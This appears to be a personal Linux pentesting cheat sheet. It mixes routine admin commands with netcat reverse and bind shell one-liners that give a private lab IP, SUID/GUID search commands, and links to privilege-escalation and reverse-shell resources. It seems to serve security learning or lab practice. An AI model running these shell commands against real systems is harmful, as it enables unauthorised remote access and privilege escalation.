`history`
`service x start`
`systemctl enable x`

`systemctl list-timers`
lists timers waiting to run

type any one of the following command to find os name and version in Linux:
`cat /etc/os-release`
`lsb_release -a`
`hostnamectl`

`nc`
- example reverse\
target: nc 192.168.129.129 4444 -e /bin/bash\
attacker: nc -nvlp 4444
- example bind\
target: nc -nlvp 444 -e /bin/bash\
attacker: nc 192.168.129.129 444
- on both: first listen, then connect

`linpeas`
search for possible paths to escalate privileges
also https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
also also https://github.com/rebootuser/LinEnum

`pspy`
Monitor linux processes without root permissions 

`unix reverse shells one liners`
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

`Unix binaries that can be used to bypass local security restrictions`
https://gtfobins.github.io/

```find / -perm -u=s -type f 2>/dev/null```
Find SUID
```find / -perm -g=s -type f 2>/dev/null```
Find GUID

`/bin/sh -i`
get an interactive tty shell https://netsec.ws/?p=337

